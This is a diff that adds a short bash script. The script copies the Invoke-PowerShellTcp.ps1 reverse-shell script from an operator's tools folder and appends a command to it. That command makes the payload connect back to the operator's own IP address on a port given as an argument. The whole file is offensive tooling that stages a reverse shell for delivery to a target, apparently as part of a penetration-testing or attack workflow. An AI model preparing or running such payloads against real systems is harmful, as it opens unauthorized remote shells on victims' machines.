@@ -1,0 +1,5 @@
+#!/bin/bash                                                       
+IP=$( IP_No_Clip );                      
+New_IP=$( echo -n $IP );                                                                                                              
+cp /root/Ops/Tools/Invoke-PowerShellTcp.ps1 .;
+echo "Invoke-PowerShellTcp -Reverse -IPAddress $New_IP -Port $1" >> Invoke-PowerShellTcp.ps1;
